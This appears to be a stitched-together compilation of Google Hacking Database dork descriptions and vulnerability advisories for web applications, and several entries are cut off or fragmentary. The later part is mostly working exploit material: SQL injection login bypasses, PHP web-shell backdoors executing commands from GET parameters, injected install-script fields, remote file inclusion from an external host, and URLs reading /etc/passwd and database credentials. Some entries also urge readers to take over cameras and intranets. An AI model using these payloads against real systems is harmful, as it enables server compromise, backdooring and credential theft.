	<textualDescription>These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I've noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* ('scuse me. must be a furball) OK, lets say BEST CASE scenario. Let's say there's not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing. </textualDescription>

	<shortDescription>intitle:"Welcome to IIS 4.0"</shortDescription>
	<textualDescription>Moving from personal, lightweight web servers into more production-ready software, we find that even administrators of Microsoft's Internet Information Server (IIS) sometimes don't have a clue what they're doing. By searching on web pages with titles of &quot;Welcome to IIS 4.0&quot; we find that even if they've taken the time to change their main page, some dorks forget to change the titles of their default-installed web pages. This is an indicator that their web server is most likely running, or was upgraded from, the now considered OLD IIS 4.0 and that at least portions of their main pages are still exactly the same as they were out of the box. Conclusion? The rest of the factory-installed stuff is most likely lingering around on these servers as well. 
Old code: FREE with operating system.
Poor content management: an average of $40/hour. 
Factory-installed default scripts: FREE with operating system.
Getting hacked by a script kiddie that found you on Google: PRICELESS.

	<textualDescription>Backup directories are often very interesting places to explore. More than one server has been compromised by a hacker's discovery of sensitive information contained in backup files or directories. Some of the sites in this search meant to reveal the contents of their backup directories, others did not. Think about it. What.s in YOUR backup directories? Would you care to share the contents with the whole of the online world? Probably not. Whether intentional or not, bsp.gsa.gov reveals backup directory through Google. Is this simply yet another misconfigured .gov site? You decide. BSP stands for &quot;best security practices,&quot; winning this site the Top GoogleDork award for this category.</textualDescription>

Hackers can find them with Google. I go easy on these folks since the odds are they.ve patched their sites already. Then again, they may just show up on zone-h..</textualDescription>

Everyone, that is except googleDorks. GoogleDorks, it seems, don't understand that anyone in possession of your private keyring (secring) can get to your secret stuff. It should noever be given out, and should certainly not be posted on the Internet. The highest ranking is awarded for this surprising level of ineptitude.</textualDescription>

An attacker can look for the ADMIN button and try the default passwords found in the documentation. An attacker may also find that the directories are browsable. Additional security related information was found on the Internet.

Securityfocus(www.securityfocus.com):
----------------------------------------------------
&quot;It has been reported that the Axis Video Servers do not properly handle input to the 'command.cgi' script. Because of this, an attacker may be able to create arbitrary files that would result in a denial of service, or potentially command execution.&quot;

It is typicaly used by the underground sites on the Net who &quot;pay for surfing ads&quot; and advertise spam services or software.

An attacker can find these sites by searching for the typical &quot;powered by hit jammer !&quot; frase on the bottom of the main page. Then if he changes the URL to www.target.com/admin/admin.php he is taken to the admin panel. 

Hit Jammer administrators are warned to protect this page with the .htaccess logon procedure, but many fail to do just that. In such cases, customer information like email addresses and passwords are in clear view of the attacker. Since human beings often use one simple password for many things this is a very dangerous practice.

The built-in login system makes sure that only people with the right username and password gains access to PHPFM, however, you can also choose to disable the login system and use PHPFM for public access. 

It can currently: create, rename and delete folders; create, upload, rename, download and delete files; edit text files; view image files; sort files by name, size, permissions and last modification date both ascending and descending; communicate in more languages. 

This search finds those &quot;public&quot; versions of PHPFM. An attacker can use them to manage his own files (phpshell anyone ?).

	<textualDescription>PHP Shell is a shell wrapped in a PHP script. It's a tool you can use to execute arbiritary shell-commands or browse the filesystem on your remote Web server. This replaces, to a degree, a normal telnet-connection. You can use it for administration and maintenance of your Web site using commands like ps, free, du, df, and more.

If these shells aren't protected by some form of authentication, an attacker will basicly *own* the server. This search finds such unprotected phpshells by looking for the keyword &quot;enable stderr&quot;.

indicates admin login is possible by the appearance of three text lines:

Create Administrator Login
Delete old administrator user ....ok

These software solutions are often used by companies offering a &quot;simple&quot; but &quot;cost effective&quot; way to their users who don't know unix or html. There is a problem sometimes with this specific filemanager due to insecure use of the session ID that can be found in the unprotected &quot;fileman.log&quot; logfile. 

It has been reported that an attacker can abuse the last document-edit-url of the logfile. By copy pasting that line in a new window it gives the attacker valid user credentials on the server, at least for a while.. (think hours not seconds).</textualDescription>

	<textualDescription>http://www.cirt.net/advisories/ew_file_manager.shtml:

Product: EasyWeb FileManager Module - http://home.postnuke.ru/index.php

Description: EasyWeb FileManager Module for PostNuke is vulnerable to a directory traversal problem which allows retrieval of arbitrary files from the remote system. Systems Affected: EasyWeb FileManager 1.0 RC-1

Technical Description: The PostNuke module works by loading a directory and/or file via the &quot;pathext&quot; (directory) and &quot;view&quot; (file) variables. Providing a relative path (from the document repository) in the &quot;pathext&quot; variable will cause FileManager to provide a directory listing of that diretory. Selecting a file in that listing, or putting a file name in the &quot;view&quot; variable, will cause EasyWeb to load the file specified. Only files and directories which can be read by the system user running PHP can be retrieved.

Assuming PostNuke is installed at the root level:
/etc directory listing:
/index.php?module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc

/etc/passwd file:
/index.php?module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc/&amp;view=passwd

Fix/Workaround:
Use another file manager module for PostNuke, as the authors do not appear to be
maintaining EW FileManager.

Vendor Status: Vendor was contacted but did not respond.
Credir: Sullo - cirt.net

NOTE: mitigating factor, an attacker needs to be registred and logged on to have access rights to this module.</textualDescription>

	<textualDescription>Webmasters wanting to exclude search engine robots from certain parts of their site often choose the use of a robot.txt file on the root of the server. This file basicly tells the bot which directories are supposed to be off-limits.

An attacker can easily obtain that information by very simply opening that plain text file in his browser. Webmasters should *never* rely on this for real security issues. Google helps the attacker by allowing a search for the &quot;disallow&quot; keyword.</textualDescription>

So any Netware username defined in the server's NDS database w/o a password can authenticate.

After the Google results are displayed, an attacker wil go to the company base web url and learn about employees, preferably their email addresses. Then bounce to the portal management login and try their username w/o a password.</textualDescription>

	<textualDescription>http://www.securityfocus.com/bid/10968/discussion/

&quot;A vulnerability is reported to exist in Gallery that may allow a remote attacker to execute malicious scripts on a vulnerable system. This issue is a design error that occurs due to the 'set_time_limit' function.

The issue presents itself because the 'set_time_limit' function forces the application to wait for 30-seconds before the verification and discarding of non-image files takes place. This allows for a window of opportunity for an attacker to execute a malicious script on a server.

Gallery 1.4.4 is reported prone to this issue, however, other versions may be affected as well. &quot;</textualDescription>

This search finds that register.php form of course :)

	<textualDescription>Toast Forums is an ASP message board on the Internet. Toast Forums also has all the features of an advanced message board (see hxxp://www.toastforums.com/). The problem is in the install documentation (quoting):

-- start quote --
2. Rename the data.mdb file to a different name. After renaming the data.mdb file, open constants.asp and change the tstDBConnectString constant to reflect the new name. 
-- end quote --

This search finds sites running Toast Forum by using the LINK: operator. Trial and error is needed to find the database file from the results by changing the URL. Member data can be found in the table &quot;tstdb_Member&quot;. It looks like this:

&quot;ID&quot; &quot;FName&quot; &quot;LName&quot; &quot;Username&quot; &quot;Password&quot; &quot;Email&quot; &quot;HideEmail&quot; &quot;ICQ&quot; &quot;Homepage&quot; &quot;Signature&quot; &quot;IP&quot; &quot;Skin&quot; &quot;IncludeSignature&quot; &quot;NotifyDefault&quot; &quot;PostCount&quot; &quot;LastLoginDate&quot; &quot;LastPostDate&quot;

Passwords are encrypted with the RC4 algoritm, so an attacker would find cracking them is (more) difficult (than usual).

	<shortDescription>inurl:"nph-proxy.cgi" "Start browsing through this CGI-based proxy"</shortDescription>
	<textualDescription>Observing the web cracker in the wild, one feels like they are watching a bear. Like a bear stocks up on food and then hibernates, a web cracker must stock up on proxies, and then hack until they run out.

Web crackers are a distinct breed, and many do not comfort well with the draconian measures that many other crackers take, such as port and service scanning, the modern web cracker finds such tactics much too intrusive. This leaves the web cracker with the only viable option to come in contact with a large number of proxies being to use public proxy lists. These are of course very slow, and very very unstable, and do not allow the cracker much time between his proxy runs.

Luckily google gives them another option, if they are smart enough to find it.

CGI-proxy ( http://www.jmarshall.com/tools/cgiproxy/ ) is a CGI-based proxy application. It runs on a web server, and acts as an http proxy, in CGI form. A prudent site owner would hide it behind .htaccess, as most do, but with a powerful tool like google, the inprudent few who leave it open can quickly be seperated from the wise masses.

CGI-proxy's default page contains the text, as you can see in the demo on their site:

&quot;Start browsing through this CGI-based proxy by entering a URL below. Only HTTP and FTP URLs are supported. Not all functions will work (e.g. some JavaScript), but most pages will be fine.&quot;

The proxy as it resides on a server is most often called nph-proxy.cgi. A web cracker can now use google to enumerate his list of proxy servers, like so:

inurl:&quot;nph-proxy.cgi&quot; &quot;Start browsing through this CGI-based proxy&quot;

More results can be obtained by admitting the &quot;inurl:nph-proxy.cgi&quot; constraint, but much more trash is generated as well.</textualDescription>

Anyways, this search by JimmyNeutron uncovers a few of these certificate servers directly connected to the Internet. Which (in theory) means anyone could issue a certificate from these sites and abuse it to mislead websurfers in phishing scams and such.</textualDescription>

	<shortDescription>"Powered by Caudium Webserver" -caudium.net</shortDescription>
	<textualDescription>What is the Caudium WebServer? 
 
 Caudium is the name of a GPL-ed (free for commercial and personal use) web server written in Pike and in C. It is originally based on the Roxen Challenger 1.3 code base. 
 It is an attractive alternative to servers like Apache, Netscape and Zeus due to its strength in dynamic page and data generation, modularity and more. 
 The Caudium Project runs also an IRC network, has created a GPL webmail called CAMAS and has an ever-growing community of developers and users worldwide. 
 
 What are Caudium's Benefits? 
 
 Performance: Caudium is a non-forking monolithic web server. Most web servers, like Apache 1.3, fork processes to keep up with demand, creating a less scalable solution when a sudden burst of traffic hits your web site. 
 An optional multi-threaded mode further increases performance especially when dealing with dynamically generated pages. 
 
 [..] 
 
 Flexibility: You can write new tags and modules, easily extend Caudium using Pike or C and take advantage of the configuration interface. 
 Dynamic content can be generated with RXML, PHP or CGIs thus migration from other servers like Apache is very easy. 
 
 Platform independance: Caudium is shipped with Debian GNU/Linux and FreeBSD ports and runs on many other Unix-like systems (Any Linux-based, OpenBSD, NetBSD, Solaris, AIX, Darwin/MacOS X) 
 It is written in Pike and C.

	<textualDescription> &quot;Open WebMail is a webmail system based on the Neomail version 1.14 from Ernie Miller. Open WebMail is designed to manage very large mail folder files in a memory efficient way. It also provides a range of features to help users migrate smoothly from Microsoft Outlook to Open WebMail&quot;. A remote attacker can run arbitrary commands with the web server's privileges by exploiting an unfiltered parameter in userstat.pl. 
 
 Details 
 Vulnerable Systems: 
 * Open Webmail versions 2.20, 2.21 and 2.30 
 * Limited exploitation on openwebmail-current.tgz that was released on 2004-04-30 (See below) 
 
 The vulnerability was discovered in an obsolete script named userstat.pl shipped with Open Webmail. The script doesn't properly filter out shell characters from the loginname parameter. The loginname parameter is used as an argument when executing openwebmail-tool.pl from the vulnerable script. By adding a &quot;;&quot;, &quot;|&quot; or &quot;( )&quot; followed by the shell command to a http GET, HEAD or POST request an attacker can execute arbitrary system commands as an unprivileged user (the Apache user, &quot;nobody&quot; or &quot;www&quot;, e.g.).

	<textualDescription>Plesk Server Administrator (PSA) is web based software that enables remote administration of web servers. It can be used on Linux and other systems that support PHP. 
 
 Due to an input validation error in Plesk Server Administrator, it is possible for a remote attacker to make a specially crafted web request which will display PHP source code. 
 
 This is acheivable by connecting to a host (using the IP address rather than the domain name), and submitting a request for a known PHP file along with a valid username.

	<textualDescription>Network Query Tool enables any Internet user to scan network information using:

* Resolve/Reverse Lookup
* Get DNS Records
* Whois (Web)
* Whois (IP owner)
* Check port (!!!)
* Ping host
* Traceroute to host
* Do it all

The author has been informed that the nqt form also accepts input from cross site pages, but he will not fix it.

A smart programmer could use the port scan feature and probe al the nmap services ports. Though this would be slow, but it provides a higher degree of  anonymity, especially if the attacker is using a proxy or an Internet Cafe host to access the NQT pages.

It gets even worse .. an attacker can scan the *internal* hosts of the networks that host NQT in many cases. Very dangerous.

The database contains the plain text password.

##############################################################

[1]Introduction

&quot;CubeCart is an eCommerce script written with PHP &amp; MySQL. With CubeCart you can setup a powerful online store as long as you

have hosting supporting PHP and one MySQL database.&quot;

This info was taken from hxxp://www.cubecart.com

CubeCart, from Brooky (hxxp://www.brooky.com), is a software formerly known as eStore.


[2]The Problem

A remote user can cause an error in index.php using the parameter 'cat_id' which is not properly validated, displaying the

software's full installation path. It can also be used to inject sql commands. Examples follow:

(a) http://example.com/store/index.php?cat_id='

causes an error like this:

&quot;Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in

/home/example/public_html/store/link_navi.php on line 35

Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in

/home/example/public_html/store/index.php on line 170

Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in

/home/example/public_html/store/index.php on line 172&quot;


(b) http://example.com/store/index.php?cat_id=1 or 1=1--

displays all categories in the database


[3]The Solution

None at this time.Vendor contacted and fix will be avaliable soon.

	<textualDescription>SalesLogix is the Customer Relationship Management solution that
drives  sales performance in small to medium-sized businesses through Sales, Marketing, and Customer Support automation and back-office integration.

The problem:

By manipulating the cookies used by the Web Client, it is possible to
trick the  server into authenticating a remote user as the CRM administrator without requiring a password.
 
 It is also possible to perform SQL injection attacks on the SQL server
that is used as the data store for the SalesLogix CRM system, reveal detailed error reports contained in HTTP headers and disclose the real filesystem paths to various SalesLogix directories.

 The SalesLogix server itself is vulnerable to an attack that would
allow a malicious user to obtain the username and password used to access the SQL server used as a data store. The disclosed username and password always have read/write permissions on the database.

 Another vulnerability in the SalesLogix server allows an
unauthenticated user to upload arbitrary files to the server in any directory (s)he chooses.

	<shortDescription>"Powered by DMXReady Site Chassis Manager" -site:dmxready.com</shortDescription>
	<textualDescription>It is reported that DMXReady Site Chassis Manager is susceptible to two remotely exploitable input validation vulnerabilities. These vulnerabilities are due to a failure of the application to properly sanitize user-supplied data.

The first issue is an unspecified cross-site scripting vulnerability. This issue could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were to be followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.

The second issue is an unspecified SQL injection vulnerability. It may be possible for a remote user to inject arbitrary SQL queries into the underlying database used by the application. This could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.

Successful exploitation could result in compromise of the application, disclosure or modification of data or may permit an attacker to exploit vulnerabilities in the underlying database implementation.</textualDescription>

	<textualDescription>cachemgr.cgi is a management interface for the Squid proxy service. It was installed by default in /cgi-bin by RedHat Linux 5.2 and 6.0 installed with Squid. This script prompts for a host and port which it then attempts to connect to. If a web server, such as apache, is running this can be used to connect to arbitrary hosts and ports, allowing for potential use as an intermediary in denial of service attacks, proxied port scans, etc. Interpreting the output of the script can allow the attacker to determine whether or not a connection was established. </textualDescription>

I can for instance find out the admin username (not just the adin every user) and also if it password protected and if the password ever expires plus is it a current user account, also do the same for any guest accounts, Ok nice and easy how about the O/S and all the Mapped Drive locations all there along with installed software and even currently running applications and processes. Site admins would have to be mad to leave this stuff open, but as we all know from the GHDB Site admins do weird and funny stuff. 
This one just gives out to much to list, so go have a look and see what you can find.</textualDescription>

Some of the sites are very, very interesting - try a search substituting site:gov instead of site:com, or try site:edu or site:org or site:fm.  Anyway, camera servers made by Axis Video, you can look up administrator manuals online via the following search string (guess what you might find there?):

site:com inurl:axis video server manuals

Can you say default UID and PW?

What's really interesting is if you look hard enough; you can find cameras within government and educational labs; airport surveillance; even some stretches of I65 in the US (for those of you close to the Ohio River area).

Anyway this search string gets you into the server; from there you can have many controls or few controls over the cameras (including zoom, pan, and iris).  There is much to see and most of the cameras have easy acccess to admin profile via click of a button - of course from there you have to provide a UID &amp; PW.  But read up on the manuals any you may get lucky.

Bottom line, if you can control the camera (via admin priv.) you can control what and when the camera &amp; server view as well as what &amp; when they record.  Just a small seed for a possibly big idea - your ambitions may vary.

Rate it!  Give me feedback!  I will not learn without some form of criticism...yet despite how insignificant that criticism may make me feel...i enjoy the search for the unseen/unknown knowledge nonetheless...it was worth it.</textualDescription>

	<textualDescription>File_id.diz is a description file uploaders use to describe packages uploaded to FTP sites. Although rooted in legitimacy, it is used largely by software piracy groups to describe their ill gotten goods. Systems administrators finding file_id.diz in directory listings on their servers may discover their boxes have been hacked and are being used as a distroubtion site for pirated software. 

.nfo's often contain info on which piracy group the files have passed through on their way to their final resting place. This helps weed out false positives.

	<textualDescription>This searches for tns names files.  This is an Oracle configuration file that sets up connection strings for someone's Oracle client to contact the various databases it is managing.  This file contains ports, IP's and server names of these database machines.  What I think is more telling is that in most cases, this file is stored in Oracle's installation directory which can probably be more telling.</textualDescription>

	<textualDescription>this is a mod of one of the previous queries posted in here. the basic thing is, to add this:
21232f297a57a5a743894a0e4a801fc3
to your query, that oryginally results in a username lists with a MD5 encrypted password.

this one finds mysql dumps with for a users who's passwords
are &quot;admin&quot; :)

the &quot;21232f297a57a5a743894a0e4a801fc3&quot; is md5 result for &quot;admin&quot;

you can try it with other queris on this site.
use also:
63a9f0ea7bb98050796b649e85481845 for root
098f6bcd4621d373cade4e832627b4f6 for test
3c3662bcb661d6de679c636744c66b62 for sex
f561aaf6ef0bf14d4208bb46a4ccb3ad for xxx

if you'll get lucky, you'll get a username, and a encryoted password, witch is the one above that u used.

remember, that this works for all files that contain plaintex username and md5 encrypted passwords. use this techniq with other queris that you'll find here

uff... i hope i made my self clear.</textualDescription>

Funny enough, many of the DES hashes seem to use a salt of &quot;ae&quot;.  I tried just using this string along with the inurl portion, but it seemed to inappropriately restrict the search.  Couple this with [3] and, um, yeah.

	<textualDescription>Reportedly Coppermine Photo Gallery is prone to multiple input validation vulnerabilities, some of which may lead to arbitrary command execution. These issues are due to the application failing to properly sanitize and validate user-supplied input prior to using it in dynamic content and system command execution function calls.

These issues may be exploited to steal cookie based authentication credentials, map the application root directory of the affected application, execute arbitrary commands and include arbitrary files. Other attacks are also possible.

	<textualDescription>This error message highlights potentially unpatched or misconfigured Netscape Application Server or iPlanet application servers. An inquisitive mind would probably want to manually alter the URL's returned by this query, just to see what other, more informative messages might be revealed. As these servers are already exhibiting a misconfiguration, this could lead to other vulnerabilities being discovered.

Finally, these servers are running software that is a few years old now. An attacker may feel that because of this, there's a strong possibility that they're not patched-up fully either, making them potentially vulnerable to known exploits.</textualDescription>

I'll leave it to others to find out if anything cool can be done with this.

==============
Hosting Controller is a complete array of Web hosting automation tools for the Windows Server family platform. It is the only multilingual software package you need to put your Web hosting business on autopilot.

The HC has its own complete billing solution which is tightly integrated within Control Panel &amp; does all the invoicing &amp; billing.

Vuln:
======
A remote authenticated user can invoke 'resellerdefaults.asp' to view reseller add-on plans and then load the following type of URL to view the details of a target reseller's plans:

The 'resellerresources.asp' script does not properly validate user-supplied input in the 'resourceid' parameter. A remote authenticated user can supply specially crafted parameter values to execute SQL commands on the underlying database. This can be exploited, for example, to delete a reseller add-on plan.

	<shortDescription>intext:"Powered by flatnuke-2.5.3" +"Get RSS News" -demo</shortDescription>
	<textualDescription>Description of Vulnerabilities

Multiple vulnerabilities in FlatNuke have been reported, which can be exploited by remote users to trigger denial of service conditions, execute arbitrary PHP code, conduct Cross-Site Scripting attacks and disclose arbitrary images and system information.

If the &quot;/flatnuke/foot_news.php&quot; script is accessed directly a while() call is made that enters an infinite loop, leading to full CPU utilisation.

[..]

User-supplied input passed to the &quot;image&quot; parameter in the &quot;thumb.php&quot; script is not correctly validated. This can be exploited to disclose arbitrary images from external and local resources via directory traversal attacks, or to disclose the installation path.

It is also possible to disclose the system path by accessing certain scripts directly or specially formed parameters.</textualDescription>

Gravity Board X v1.1 (possibly prior versions) 
Remote code execution, SQL Injection / Login Bypass, cross site scripting, path 
disclosure poc 

software: 
author site: http://www.gravityboardx.com/ 


a) Sql Injection / Login Bypass: 

If magic_quotes off, A user can bypass login check and grant administrator privileges on target 
system: 

login: ' or isnull(1/0) /* 
password: whatever 



b) Cross site scripting poc: 

b.1)After he login as administrator he can edit template to insert evil javascript 
code. Try to insert at the end of the template these lines: 

&lt;/STYLE&gt; 
alert(document.cookie) 

b.2)A user can craft a malicious url like this to access target user cookies: 

http://[target]/[path]/deletethread.php?board_id=&quot;&gt;alert(document.cookie) 



c) Remote commands/php code execution: 

c.1) Always editing the template, attacker can leave a backdoor in target system, 
example, at the end of template: 

&lt;/STYLE&gt; 
&lt;?php 
error_reporting(0); //to show no errors when page is called normally 
system($HTTP_GET_VARS[cmd]); 
?&gt; 

After, the attacker can launch commands by this urls: 

http://[target]/[path]/index.php?cmd=ls%20-la            

to list directories... 

http://[target]/[path]/index.php?cmd=cat%20/etc/passwd 

to see Unix /etc/passwd file 

http://[target]/[path]/index.php?cmd=cat%20config.php 

to see database username/password 

c.2) An IMPORTANT NOTE: You can edit template without to be logged in as administator, calling 
editcss.php script, look at the code of this script: 

if($fp = fopen('gbxfinal.css','w')){ 
fwrite($fp, $csscontent); 
fclose($fp); 
echo ''; 
}else{ 
echo 'Gravity Board X was unable to save changes to the CSS template.'; 
} 

you can easily deface the forum and/or insert a backdoor calling an url like this: 

http://[target]/[path]/editcss.php?csscontent=&lt;/style&gt;&lt;?php%20system($HTTP_GET_VARS[cmd]);%20?&gt; 

then execute commands: 

http://[target]/[path]/index?cmd=[command] 

It's also possible to disclose path: 

d) path disclosure: 

http://[target]/[path]/deletethread.php?perm=1 
http://[target]/[path]/ban.php 
http://[target]/[path]/addnews.php 
http://[target]/[path]/banned.php 
http://[target]/[path]/boardstats.php 
http://[target]/[path]/adminform.php 
http://[target]/[path]/forms/admininfo.php 
http://[target]/[path]/forms/announcements.php 
http://[target]/[path]/forms/banform.php 

ans so on...calling scripts in /forms directory

Simplicity OF Upload 1.3 (possibly prior versons) remote code execution 
&amp; cross site scripting

software: 
author site: http://www.phpsimplicity.com/scripts.php?id=3


remote commands execution:

problem at line 25-30: 
...
//check for language overriding..
if (isset($_GET['language']))
   $language = strtolower($_GET['language']);

//now we include the language file
require_once(&quot;$language.lng&quot;);
...

you can include whatever adding a null byte to &quot;language&quot; parameter value:

example:
http://localhost:30/simply/download.php?language=upload.php%00

you will see upload &amp; download page together :)

so you can upload a cmd.gif (when you upload a .php file, usually it is
renamed to .html...)  file with this php code inside to execute
commands:

&lt;?php

system($HTTP_GET_VARS[command]);

?&gt;

then try this url:

http://[target]/[path]/download.php?language=cmd.gif%00&amp;command=ls

to list directories

http://[target]/[path]/download.php?language=cmd.gif%00&amp;command=cat%20/etc/passwd

to show /etc/passwd file

cross site scripting:

also, a remote user can supply a specially crafted URL to redirect other people
to an evil page:

http://[target]/[path]/download.php?language=http://[evil_site]/[evil_page]%00

login as user:   ' OR 'a'='a
and pass     :   ' OR 'a'='a 
          
boom! you're admin ...

the problem is in usercheck.php at line 5:

$sql = &quot;select username from newsadmin where username='$checkuser' and password='$checkpass'&quot;;

you can post always true statements, like 'a'='a'

solution: replace $checkuser and $checkpass vars with your username and pass, by the moment

path disclosure: 
http://[target]/[path_to_funkboard]/images/forums.php 

database username &amp; password disclosure: 

during installation is not remembered to delete the mysql_install script and the installation 
do not delete it, usually: 

http://[target]/[path]/admin/mysql_install.php 

or 

http://[target]/[path]/admin/pg_install.php 

there, a user can see database clear text username &amp; password ... 

Then, the script let the user proceed to the next page, where he can reset funkboard administator 
username &amp; password. Now the script faults, because some tables exist, etc. 
So  user can go back and setting a new database name for installation, guessing among other 
installations on the server... 
Once Installation succeeded he can set new admin username e password then login at this page: 

http://[target]/[path]/[path_to_funkboard]/admin/index.php 

Now the user can edit templates and append some evil javascript code. 


remote code execution: 

look at this code in mysql_install.php : 

$infoout = &quot;&lt;?php\n\n// server name, eg. localhost\n\$server = '$server1';\n// your database's name\n\$dbname = '$dbname1';\n// your username to access that database\n\$dbuser = '$dbuser1';&quot;; 
$infoout.= &quot;\n// your password to access that database\n\$dbpass = '$dbpass1';\n\n// a contact email for when errors arise\n\$email = '$email1';&quot;; 
$infoout.= &quot;\n\n// database engine- 'mysql' or 'postgres'\n\$dbtype='$dbtype1';\n\n?&gt;&quot;; 

echo &quot;Writing Config File&lt;br&gt;&quot;; 
unlink (&quot;../info.php&quot;); 

$outname=&quot;../info.php&quot;; 
$file = fopen($outname,&quot;w+&quot;); 
fputs($file, $infoout); 
fclose($file); 

clearly, you can inject php code, example: 

go to http://[target]/[path]/admin/mysql_install.php 

in email field (not checked) write: 

email@domain.com'; error_reporting(0); system($HTTP_GET_VARS[command]); echo ' 

press continue... 

now look at info.php, the config file in main directory, you have: 

&lt;?php 

// server name, eg. localhost 
$server = 'localhost'; 
// your database's name 
$dbname = 'dbname'; 
// your username to access that database 
$dbuser = 'dbuser'; 
// your password to access that database 
$dbpass = 'dbpassword'; 

// a contact email for when errors arise 
$email = 'email@domain.com'; error_reporting(0); system($HTTP_GET_VARS[command]); echo ''; 

// database engine- 'mysql' or 'postgres' 
$dbtype='mysql'; 

?&gt; 

so, you have a backdoor on target system... 

you can launch commands by this urls: 

http://localhost:30/funkboard/info.php?command=ls%20-la 

to list directories... 

http://localhost:30/funkboard/info.php?command=cat%20/etc/passwd 

to see /etc/passwd file

	<shortDescription>intitle:"Owl Intranet " intext:"Owl Intranet Engine" +"Version:"  inurl:/intranet/ -edu -ac -gov -org</shortDescription>
	<textualDescription>Owl Intranet Engine is prone to multiple cross-site scripting and SQL injection vulnerabilities. The issues are reported to exist in the 'browse.php' script.

An attacker could exploit the cross-site scripting issues by enticing a victim user into following a malicious link that contains hostile HTML and script code. This could be exploited to steal cookie-based authentication credentials.

The SQL injection vulnerabilities could allow the attacker to influence the structure or logic of SQL queries made by the application. This could have various impacts, including compromise of the software, exposure and modification of sensitive information, or a potential for attacks against the database implementation itself.

The attacker may need to provide a valid session ID to exploit these issues.

you can also download some of the files where security is not that strong for the anon user.

b) arbitrary file inclusion:

a user can view any file on the target server,if not with .php extension:

http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../boot.ini%00
http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../boot.ini%00

can execute arbitrary file resident on target server, if with .php extension,
example :

http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../[script].php%00
http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../[script].php%00

can craft a malicious url to cause victim user to execute commands on external
site:

http://[target]/saveweb/menu_dx.php?SITE_Path=http://[external_site]/cmd.gif%00
http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=http://[external_site]/cmd.gif%00

where cmd.gif is a file like this:

&lt;?php system('[some command]'); ?&gt;

PBLang 4.65 (possibly prior versions) remote code execution / administrative
credentials disclosure / system information disclosure / cross site scripting /
path disclosure

software:

description: PBLang is a powerful flatfile Bulletin Board System. It combines
many features of a professional board, but does not even require SQL support. It
is completely based on text-file.

site: http://pblang.drmartinus.de/
download: https://sourceforge.net/project/showfiles.php?group_id=62953

1) system disclosure:

you can traverse directories and see any file (if not .php or .php3 etc.) and
include any file on target system using '../' chars and null byte (%00), example:

http://target]/[path]/pblang/setcookie.php?u=../../../../../etc/passwd%00

vulnerable code in setcookie.php:

   ...
16 $usrname=$HTTP_GET_VARS['u'];
17 @include($dbpath.'/'.$usrname.'temp');
   ...

2) remote code execution:

board stores data in files, when you register a [username] file without extension
is created in /db/members directory, inside we have php code executed when you
login, so in location field type:

madrid&quot;; system($HTTP_POST_VARS[cmd]); echo &quot;

in /db/members/[username] file we have

...
$userlocation=&quot;madrid&quot;; system($HTTP_GET_VARS[cmd]); echo &quot;&quot;;
...

no way to access the script directly, /db/members is .htaccess protected
and extra lines are deleted from files after you login, so you should make
all in a POST request and re-register

this is my proof of concept exploit, to include [username] file I make a GET request of setcookie.php?u=[username]%00&amp;cmd=[command] but you can call username file through some other inclusion surely when you surf the forum:

http://rgod.altervista.org/pblang465.html 

3)admin/user credentials disclosure:

you can see password hash of any user or admin sending the command:

cat ./db/members/[username]


4) cross site scripting:

register and in location field type:

madrid&quot;; echo &quot;alert(document.cookie)

then check this url:

http://[target]/[path]/setcookie.php?u=[username]%00


5) path disclosure:

http://[target]/[path]/setcookie.php?u=%00

class-1 Forum Software is a PHP/MySQL driven web forum. It is written and distributed
under the GNU General Public License which means that its source is freely-distributed
and available to the general public. 

vulnerability: the way the forum checks attachment extensions...
look at the vulnerable code at viewforum.php 256-272 lines.


nothing seems so strange, but... what happen if you try to upload a file
with this name? :

shell.php.' or 'a' ='a

;)

[1] SQL INJECTION!

The query and other queries like this become:

SELECT * FROM [extensions table name] WHERE extension='' or 'a' ='a' AND file_type='Image'

you have bypassed the check... now an executable file is uploaded, because for Apache, both
on Windows and Linux a file with that name is an executable php file...

you can download a poc file from my site, at url:

http://rgod.altervista.org/shell.zip

inside we have:

&lt;?php error_reporting(0); system($HTTP_GET_VARS[command]); ?&gt;

you can do test manually, unzip the file, register, login, post this file as attachment, then
go to this url to see the directory where the attachment has been uploaded:

http://[target]/[path]/viewattach.php

you will be redirected to:

http://[target]/[path]/[upload_dir]/

then launch commands:

http://[target]/[path]/[upload_dir]/shell.php.'%20or%20'a'%20='a?command=cat%20/etc/passwd

to see /etc/passwd file

http://[target]/[path]/[upload_dir]/shell.php.'%20or%20'a'%20='a?command=cat%20./../db_config.inc

to see database username and password
and so on...

vulnerability: unsecure file creation -&gt; remote code execution

when you post an attachment and upload it to the server (usually to &quot;./upload/&quot; dir )
the script rename the file in this way:
[time() function result] + [-] + [filename that user choose]
spaces are simply replaced with &quot;_&quot; chars.
So a user can post an executable attachment, calculate the time() result locally
then, if attachment is a file like this:

&lt;?php error_reporting(0); system($HTTP_GET_VARS[command]); ?&gt;

can launch commands on target system, example:

http://[target]/[path]/[time() result]-[filename.php]?command=cat%20/etc/passwd

	<textualDescription>AzDGDatingLite V 2.1.3 (possibly prior versions) remote code execution 

software: 
site: http://www.azdg.com/ 
download page: http://www.azdg.com/scripts.php?l=english 
description:&quot; AzDGDatingLite is a Free dating script working on PHP and MySQL. 
Multilanguage, Multitemplate, quick/simple search, feedback with webmaster, Admin maillist, 
Very customizable &quot; etc. 
  
vulnerability: 

